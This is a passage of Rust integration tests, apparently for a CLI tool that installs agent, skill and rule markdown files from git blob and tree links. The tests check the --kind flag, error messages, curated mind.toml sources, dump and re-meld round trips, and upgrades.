    sb.write_and_commit(
        "vendor/thing.md",
        "---\ndescription: mystery\n---\n# thing\n",
    );
    let r = sb.mind(&["learn", &sb.link("blob/main/vendor/thing.md")]);
    assert!(!r.success, "an unclassifiable file must fail: {}", r.stdout);
    assert!(
        r.stderr.contains("--kind") && r.stderr.contains("frontmatter"),
        "the error must name the ways to resolve it: {}",
        r.stderr
    );
    assert_eq!(source_count(&sb), 0, "nothing registered on failure");
}

#[test]
fn a_directory_kind_on_a_file_link_is_a_mismatch() {
    // spec: LNK-21
    let sb = file_item_sandbox();
    let r = sb.mind(&[
        "learn",
        &sb.link("blob/main/agents/dev.md"),
        "--kind",
        "skill",
    ]);
    assert!(!r.success, "--kind skill on a file must fail: {}", r.stdout);
    assert!(
        r.stderr.contains("cannot be a skill"),
        "the error must name the mismatch: {}",
        r.stderr
    );
    assert_eq!(source_count(&sb), 0, "nothing registered on failure");
}

#[test]
fn a_non_skill_kind_on_a_directory_link_is_a_mismatch() {
    // spec: LNK-21
    let sb = Sandbox::new();
    let r = sb.mind(&[
        "learn",
        &sb.link("tree/main/skills/review"),
        "--kind",
        "agent",
    ]);
    assert!(
        !r.success,
        "--kind agent on a directory must fail: {}",
        r.stdout
    );
    assert!(
        r.stderr.contains("cannot be a agent") || r.stderr.contains("always a skill"),
        "the error must name the mismatch: {}",
        r.stderr
    );
}

#[test]
fn kind_flag_without_an_item_link_is_refused() {
    // spec: CLI-239
    // --kind describes an item link's file; with a plain repo spec (meld) or a
    // plain item ref (learn) it is a usage error, not a silent no-op.
    let sb = file_item_sandbox();
    let spec = sb.source.to_string_lossy().into_owned();
    let m = sb.mind(&["meld", &spec, "--kind", "agent", "--register-only"]);
    assert!(
        !m.success,
        "--kind with a repo spec must fail: {}",
        m.stdout
    );
    assert!(
        m.stderr.contains("--kind") && m.stderr.contains("item link"),
        "the error must say --kind applies to an item link: {}",
        m.stderr
    );
    let l = sb.mind(&["learn", "agent:dev", "--kind", "agent"]);
    assert!(
        !l.success,
        "--kind with an item ref must fail: {}",
        l.stdout
    );
    assert!(
        l.stderr.contains("--kind"),
        "the error must name the flag: {}",
        l.stderr
    );
}

#[test]
fn an_unknown_kind_value_is_refused() {
    // spec: CLI-239
    let sb = file_item_sandbox();
    let r = sb.mind(&[
        "learn",
        &sb.link("blob/main/agents/dev.md"),
        "--kind",
        "wizard",
    ]);
    assert!(!r.success, "an unknown kind must fail: {}", r.stdout);
    assert!(
        r.stderr.contains("not an item kind"),
        "the error must name the legal set: {}",
        r.stderr
    );
}

#[test]
fn blob_link_to_a_non_markdown_file_reports_bad_item_link() {
    // spec: LNK-1 LNK-14 LNK-20
    let sb = file_item_sandbox();
    let url = sb.link("blob/main/scripts/run.sh");
    let r = sb.mind(&["learn", &url]);
    assert!(!r.success, "a non-.md blob link must fail: {}", r.stdout);
    assert!(
        r.stderr.contains(&url) && r.stderr.contains("blob/<ref>/<file>.md"),
        "the error must name the URL and the file shape: {}",
        r.stderr
    );
    assert!(
        !r.stderr.contains("not a valid repo spec"),
        "it must not fall back to the generic repo-spec message: {}",
        r.stderr
    );
}

#[test]
fn a_file_link_whose_path_is_not_a_file_errors() {
    // spec: LNK-7 LNK-20
    let sb = file_item_sandbox();
    let r = sb.mind(&["learn", &sb.link("blob/main/agents/missing.md")]);
    assert!(!r.success, "a missing file must fail: {}", r.stdout);
    assert!(
        r.stderr.contains("is not a file in the clone"),
        "the error must say the path is not a file: {}",
        r.stderr
    );
    assert_eq!(source_count(&sb), 0, "nothing registered on failure");
}

#[test]
fn curated_sources_entry_can_be_a_file_link_with_a_kind() {
    // spec: DSC-100 LNK-2 LNK-20
    // A curator lists a deep blob URL to one file and declares its kind; the
    // entry registers as a file-link instance and installs under that kind.
    let lib = Sandbox::bare("lib");
    lib.write_and_commit(
        "vendor/style.md",
        "---\ndescription: House style\n---\n# style\n",
    );
    let curator = Sandbox::bare("curator");
    curator.write_and_commit(
        "mind.toml",
        &format!(
            "[discover]\nsources = [{{ source = \"{}\", kind = \"rule\", install = true }}]\n",
            lib.link("blob/main/vendor/style.md")
        ),
    );
    let spec = curator.source.to_string_lossy().into_owned();
    let r = curator.mind(&["meld", &spec, "--yes"]);
    assert!(r.success, "curator meld failed: {} {}", r.stdout, r.stderr);
    assert!(
        curator.claude_home.join("rules/style.md").exists(),
        "the curated file link must install under the declared kind: {}",
        r.stdout
    );
}

#[test]
fn a_curated_entry_with_an_unknown_kind_is_a_mind_toml_error() {
    // spec: DSC-100
    let lib = Sandbox::bare("lib");
    lib.write_and_commit("agents/dev.md", "---\ndescription: dev\n---\n# dev\n");
    let curator = Sandbox::bare("curator");
    curator.write_and_commit(
        "mind.toml",
        &format!(
            "[discover]\nsources = [{{ source = \"{}\", kind = \"wizard\" }}]\n",
            lib.link("blob/main/agents/dev.md")
        ),
    );
    let spec = curator.source.to_string_lossy().into_owned();
    let r = curator.mind(&["meld", &spec, "--register-only"]);
    assert!(
        !r.success,
        "an unknown kind must fail the meld: {}",
        r.stdout
    );
    assert!(
        r.stderr.contains("unknown kind 'wizard'"),
        "the error must name the offending value: {}",
        r.stderr
    );
}

#[test]
fn dump_emits_a_file_link_as_a_blob_url_and_carries_an_explicit_kind() {
    // spec: LNK-23
    let sb = Sandbox::bare("lib");
    sb.write_and_commit(
        "vendor/style.md",
        "---\ndescription: House style\n---\n# style\n",
    );
    let r = sb.mind(&[
        "learn",
        &sb.link("blob/main/vendor/style.md"),
        "--kind",
        "rule",
    ]);
    assert!(r.success, "learn failed: {} {}", r.stdout, r.stderr);
    let d = sb.mind(&["dump"]);
    assert!(d.success, "dump failed: {} {}", d.stdout, d.stderr);
    let sha = sb.head_sha();
    assert!(
        d.stdout.contains(&format!("/blob/{sha}/vendor/style.md")),
        "a file link dumps as a blob URL at the recorded commit: {}",
        d.stdout
    );
    assert!(
        d.stdout.contains("kind = \"rule\""),
        "the recorded explicit kind must be emitted: {}",
        d.stdout
    );
}

#[test]
fn dump_omits_kind_for_a_directory_resolved_file_link() {
    // spec: LNK-23
    let sb = file_item_sandbox();
    let r = sb.mind(&["learn", &sb.link("blob/main/agents/dev.md")]);
    assert!(r.success, "learn failed: {} {}", r.stdout, r.stderr);
    let d = sb.mind(&["dump"]);
    assert!(
        d.stdout.contains("/blob/") && !d.stdout.contains("kind ="),
        "no explicit kind was recorded, so none is emitted: {}",
        d.stdout
    );
}

#[test]
fn a_dumped_file_link_re_melds_to_the_same_instance() {
    // spec: LNK-23 LNK-20
    let sb = file_item_sandbox();
    let learned = sb.mind(&["learn", &sb.link("blob/main/agents/dev.md")]);
    assert!(learned.success, "learn failed: {}", learned.stderr);
    let identity = sb.link_name("agents/dev.md");
    let dumped = sb.mind(&["dump"]);
    let super_source = sb.base.join("super");
    std::fs::create_dir_all(&super_source).unwrap();
    write(&super_source.join("mind.toml"), &dumped.stdout);
    git(
        &super_source,
        &["-c", "init.defaultBranch=main", "init", "-q"],
    );
    git(&super_source, &["config", "user.email", "t@t"]);
    git(&super_source, &["config", "user.name", "t"]);
    git(&super_source, &["add", "-A"]);
    git(&super_source, &["commit", "-qm", "dumped"]);
    // Drop the instance, then reproduce it from the dump.
    let un = sb.mind(&["unmeld", &identity, "--yes"]);
    assert!(un.success, "unmeld failed: {} {}", un.stdout, un.stderr);
    let re = sb.mind(&["meld", &super_source.to_string_lossy(), "--yes"]);
    assert!(re.success, "re-meld failed: {} {}", re.stdout, re.stderr);
    let sources = sb.mind(&["recall", "--sources"]);
    assert!(
        sources.stdout.contains("#agents/dev.md"),
        "the dumped entry must reproduce the file-link instance: {}",
        sources.stdout
    );
}

#[test]
fn a_file_link_remedy_is_kind_qualified() {
    // spec: LNK-18 LNK-20
    // The unsatisfiable-token remedy names the linked item's own kind, not
    // `skill:`.
    let sb = Sandbox::bare("lib");
    sb.write_and_commit(
        "agents/dev.md",
        "---\ndescription: dev\n---\n# dev\nsee {{ns:other}}\n",
    );
    sb.write_and_commit("agents/other.md", "---\ndescription: other\n---\n# other\n");
    let r = sb.mind(&["learn", &sb.link("blob/main/agents/dev.md")]);
    assert!(
        !r.success,
        "a sibling token must fail the install: {}",
        r.stdout
    );
    assert!(
        r.stderr.contains("--learn 'agent:dev'"),
        "the remedy must be kind-qualified with the link's kind: {}",
        r.stderr
    );
}

#[test]
fn a_file_link_outside_its_kind_container_names_no_remedy_command() {
    // spec: LNK-18 LNK-20 LNK-21
    // No --add-root reaches a file item outside `<kind>s/`, so the error says
    // so instead of printing a command that would unmeld and then fail.
    let sb = Sandbox::bare("lib");
    sb.write_and_commit(
        "vendor/dev.md",
        "---\nkind: agent\ndescription: dev\n---\n# dev\nsee {{ns:other}}\n",
    );
    let r = sb.mind(&["learn", &sb.link("blob/main/vendor/dev.md")]);
    assert!(
        !r.success,
        "a sibling token must fail the install: {}",
        r.stdout
    );
    assert!(
        r.stderr
            .contains("outside a conventional agents/ directory"),
        "the error must explain why no command is offered: {}",
        r.stderr
    );
    assert!(
        !r.stderr.contains("mind unmeld"),
        "no destroy-then-fail command may be printed: {}",
        r.stderr
    );
}

#[test]
fn a_file_link_upgrades_like_any_source() {
    // spec: LNK-5 LNK-20
    let sb = file_item_sandbox();
    let r = sb.mind(&["learn", &sb.link("blob/main/agents/dev.md")]);
    assert!(r.success, "learn failed: {} {}", r.stdout, r.stderr);
    sb.write_and_commit(
        "agents/dev.md",
        "---\ndescription: The dev agent\n---\n# dev\nupdated\n",
    );
    let up = sb.mind(&["upgrade", "--yes"]);
    assert!(up.success, "upgrade failed: {} {}", up.stdout, up.stderr);
    let installed =
        std::fs::read_to_string(sb.claude_home.join("agents/dev.md")).expect("installed agent");
    assert!(
        installed.contains("updated"),
        "the upgrade must land the new content: {installed}"
    );
}

#[test]
fn syncs_re_walk_registers_a_curated_file_link_with_its_kind() {
    // spec: DSC-100 LNK-20
    // A curator adds a file-link entry after the initial meld; the sync
    // re-walk registers it under the declared kind, as a fresh meld would.
    let lib = Sandbox::bare("lib");
    lib.write_and_commit(
        "vendor/style.md",
        "---\ndescription: House style\n---\n# style\n",
    );
    let curator = Sandbox::bare("curator");
    curator.write_and_commit("mind.toml", "[source]\ndescription = \"curator\"\n");
    let spec = curator.source.to_string_lossy().into_owned();
    let m = curator.mind(&["meld", &spec, "--register-only"]);
    assert!(m.success, "initial meld failed: {} {}", m.stdout, m.stderr);
    curator.write_and_commit(
        "mind.toml",
        &format!(
            "[discover]\nsources = [{{ source = \"{}\", kind = \"rule\" }}]\n",
            lib.link("blob/main/vendor/style.md")
        ),
    );
    let sy = curator.mind(&["sync"]);
    assert!(sy.success, "sync failed: {} {}", sy.stdout, sy.stderr);
    let sources = curator.mind(&["recall", "--sources"]);
    assert!(
        sources.stdout.contains("#vendor/style.md"),
        "the re-walk must register the curated file link: {}",
        sources.stdout
    );
    let probe = curator.mind(&["probe"]);
    assert!(
        probe.stdout.contains("rule:style"),
        "the entry's declared kind must apply on the re-walk: {}",
        probe.stdout
    );
}
